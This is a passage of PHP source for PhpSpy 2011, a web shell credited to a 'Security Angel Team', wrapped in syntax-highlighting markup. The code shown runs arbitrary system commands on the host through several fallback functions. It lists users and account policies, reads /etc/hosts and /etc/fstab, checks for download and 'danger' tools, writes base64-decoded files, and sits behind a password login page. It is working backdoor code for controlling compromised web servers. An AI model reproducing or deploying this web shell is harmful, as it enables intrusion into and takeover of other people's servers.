#2d2d2d;\"> </span>   secparam('Userful', implode(', ',$temp));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp=array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($danger as $item)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(which($item)){$temp[]=$item;}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Danger', implode(', ',$temp));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $temp=array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($downloaders as $item)<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(which($item)){$temp[]=$item;}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Downloaders', implode(', ',$temp));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Hosts', @file_get_contents('/etc/hosts'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('HDD space', execute('df -h'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Mount options', @file_get_contents('/etc/fstab'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('OS Version',execute('ver'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('Account Settings',execute('net accounts'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('User Accounts',execute('net user'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   secparam('IP Configurate',execute('ipconfig -all'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}//end\n\nelse {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m('Undefined Action');\n}\n\n?&gt;\n&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n&lt;div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;<span style=\"text-decoration: underline;\">background:#eee;\"&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;span style=\"float:right;\"&gt;&lt;?php debuginfo();ob_end_flush();?&gt;&lt;/span&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   Powered by &lt;a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_bl<span style=\"text-decoration: underline;\">ank\"&gt;&lt;?php echo str_replace('.','','P.h.p.S.p.y');?&gt; 2011&lt;/a&gt;. Copyright (C) 2004-2011 &lt;a href=\"http://www.4ngel.net\" target=\"_blank\"&gt;Security Angel Team [S4T]&lt;/a&gt; All Rights Reserved.</span>\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&lt;?php\n\n/*======================================================\n&#20989;&#25968;&#24211;\n======================================================*/\n\nfunction secparam($n, $v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $v = trim($v);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;'.$n.' &amp;raquo;&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;div class=\"infolist\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(strpos($v, \"\\n\") === false)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($v.'&lt;br /&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   else\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;pre&gt;'.$v.'&lt;/pre&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/div&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\nfunction m($msg) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo '&lt;div style=\"margin:10px auto 15px auto;background:#ffffe0;border:1px s<span style=\"text-decoration: underline;\">olid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;\"&gt;';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo $msg;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo '&lt;/div&gt;';\n}\nfunction scookie($key, $value, $life = 0, $prefix = 1) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookie<span style=\"text-decoration: underline;\">life;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $key = ($prefix ? $cookiepre : '').$key;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $life = $life ? $life : $cookielife;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $usepo<span style=\"text-decoration: underline;\">rt);</span>\n}<span style=\"color: #f99157; background-color: #515151;\">   </span>\nfunction multi($num, $perpage, $curpage, $tablename) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $multipage = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($num &gt; $perpage) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $page = 10;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $offset = 5;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $pages = @ceil($num / $perpage);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($page &gt; $pages) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $from = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $to = $pages;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $from = $curpage - $offset;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $to = $curpage + $page - $offset - 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($from &lt; 1) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $to = $curpage + 1 - $from;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $from = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $to = $page;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif($to &gt; $pages) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $from = $curpage - $pages + $to;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $to = $pages;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(($to - $from) &lt; $page &amp;&amp; ($to - $from) &lt; $pages) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $from = $pages - $page + 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $multipage = ($curpage - $offset &gt; 1 &amp;&amp; $pages &gt; $page ? '&lt;a href=\"javas<span style=\"text-decoration: underline;\">cript:settable(\\''.$tablename.'\\', \\'\\', 1);\"&gt;First&lt;/a&gt; ' : '').($curpage &gt; 1 ? '&lt;a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\"&gt;Prev&lt;/a&gt; ' : '');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   for($i = $from; $i &lt;= $to; $i++) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $multipage .= $i == $curpage ? $i.' ' : '&lt;a href=\"javascript:settabl<span style=\"text-decoration: underline;\">e(\\''.$tablename.'\\', \\'\\', '.$i.');\"&gt;['.$i.']&lt;/a&gt; ';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $multipage .= ($curpage &lt; $pages ? '&lt;a href=\"javascript:settable(\\''.$ta<span style=\"text-decoration: underline;\">blename.'\\', \\'\\', '.($curpage + 1).');\"&gt;Next&lt;/a&gt;' : '').($to &lt; $pages ? ' &lt;a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.$pages.');\"&gt;Last&lt;/a&gt;' : '');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $multipage = $multipage ? '&lt;p&gt;Pages: '.$multipage.'&lt;/p&gt;' : '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $multipage;\n}\n// &#30331;&#38470;&#20837;&#21475;\nfunction loginpage() {\n?&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;style type=\"text/css\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">input </span>{<span style=\"color: #ffcc66;\">font:</span>11px Verdana;<span style=\"color: #ffcc66;\">BACKGROUND:</span> <span style=\"color: #000000; background-color: #FFFFFF;\">#FFFFFF</span>;<span style=\"color: #ffcc66;\">height:</span> 18px;<span style=\"color: #ffcc66;\">border:</span> 1px solid <span style=\"color: #ffffff; background-color: #666666; text-decoration: underline;\">#666666</span><span style=\"text-decoration: underline;\">;}</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/style&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;form method=\"POST\" action=\"\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;span style=\"font:11px Verdana;\"&gt;Password: &lt;/span&gt;&lt;input name=\"password\" typ<span style=\"text-decoration: underline;\">e=\"password\" size=\"20\"&gt;</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;input type=\"hidden\" name=\"action\" value=\"login\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;input type=\"submit\" value=\"Login\"&gt;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   &lt;/form&gt;\n&lt;?php\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n}//end loginpage()\n\nfunction execute($cfe) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($cfe) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(function_exists('system')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @ob_start();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @system($cfe);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = @ob_get_contents();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @ob_end_clean();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif(function_exists('passthru')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @ob_start();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @passthru($cfe);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = @ob_get_contents();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @ob_end_clean();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif(function_exists('shell_exec')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = @shell_exec($cfe);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif(function_exists('exec')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @exec($cfe,$res);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = join(\"\\n\",$res);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif(@is_resource($f = @popen($cfe,\"r\"))) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while(!@feof($f)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res .= @fread($f,1024);<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @pclose($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $res;\n}\nfunction which($pr) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $path = execute(\"which $pr\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return ($path ? $path : $pr);<span style=\"color: #f99157; background-color: #515151;\"> </span>\n}\n\nfunction cf($fname,$text){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($fp=@fopen($fname,'w')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @fputs($fp,@base64_decode($text));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @fclose($fp);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\nfunction dirsize($dir) {<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dh = @opendir($dir);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $size = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($file = @readdir($dh)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($file != '.' &amp;&amp; $file != '..') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $path = $dir.'/'.$file;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $size += @is_dir($path) ? dirsize($path) : @filesize($path);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @closedir($dh);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $size;\n}\n// &#39029;&#38754;&#35843;&#35797;&#20449;&#24687;\nfunction debuginfo() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $starttime;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mtime = explode(' ', microtime());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   echo 'Processed in '.$totaltime.' second(s)';\n}\n\n//&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;\nfunction mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306')<span style=\"text-decoration: underline;\"> {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $charsetdb;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @ini_set('mysql.connect_timeout', 5);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($link &amp;&amp; $dbname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!@mysql_select_db($dbname, $link)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Database selected has error&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   exit;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($link &amp;&amp; mysql_get_server_info() &gt; '4.1') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($charset &amp;&amp; in_array(strtolower($charset), $charsetdb)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   q(\"SET character_set_connection=$charset, character_set_results=$cha<span style=\"text-decoration: underline;\">rset, character_set_client=binary;\", $link);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $link;\n}\n\n// &#21435;&#25481;&#36716;&#20041;&#23383;&#31526;\nfunction s_array(&amp;$array) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_array($array)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($array as $k =&gt; $v) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $array[$k] = s_array($v);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else if (is_string($array)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $array = stripslashes($array);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $array;\n}\n\n// &#28165;&#38500;HTML&#20195;&#30721;\nfunction html_clean($content) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $content = htmlspecialchars($content);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $content = str_replace(\"\\n\", \"&lt;br /&gt;\", $content);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $content = str_replace(\"  \", \"&amp;nbsp;&amp;nbsp;\", $content);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $content = str_replace(\"\\t\", \"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;\", $content);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $content;\n}\n\n// &#33719;&#21462;&#26435;&#38480;\nfunction getChmod($filepath){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return substr(base_convert(@fileperms($filepath),10,8),-4);\n}\n\nfunction getPerms($filepath) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mode = @fileperms($filepath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (($mode &amp; 0xC000) === 0xC000) {$type = 's';}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif (($mode &amp; 0x4000) === 0x4000) {$type = 'd';}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif (($mode &amp; 0xA000) === 0xA000) {$type = 'l';}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif (($mode &amp; 0x8000) === 0x8000) {$type = '-';}<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif (($mode &amp; 0x6000) === 0x6000) {$type = 'b';}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   elseif (($mode &amp; 0x2000) === 0x2000) {$type = 'c';}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span> 